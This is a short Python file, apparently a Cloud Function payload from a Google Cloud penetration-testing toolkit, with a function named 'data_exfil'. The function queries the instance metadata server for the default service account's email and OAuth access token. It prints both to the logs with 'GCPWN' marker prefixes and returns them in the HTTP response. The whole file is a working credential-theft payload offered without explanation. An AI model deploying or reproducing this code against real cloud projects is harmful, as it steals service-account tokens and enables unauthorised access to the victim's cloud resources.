import json, urllib.request

_BASE = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'
_HDR = {'Metadata-Flavor': 'Google'}
_MARKER_TOKEN = 'GCPWN_CF_TOKEN='
_MARKER_EMAIL = 'GCPWN_CF_EMAIL='


def data_exfil(request):
    def _get(path):
        req = urllib.request.Request(_BASE + path, headers=_HDR)
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.read().decode()
    try:
        email = _get("email").strip()
        token = json.loads(_get("token"))
        access_token = token.get("access_token", "")
        print(_MARKER_EMAIL + email, flush=True)
        print(_MARKER_TOKEN + access_token, flush=True)
        return {"email": email, "access_token": access_token, "token": token}
    except Exception as exc:
        return {"error": str(exc)}, 500
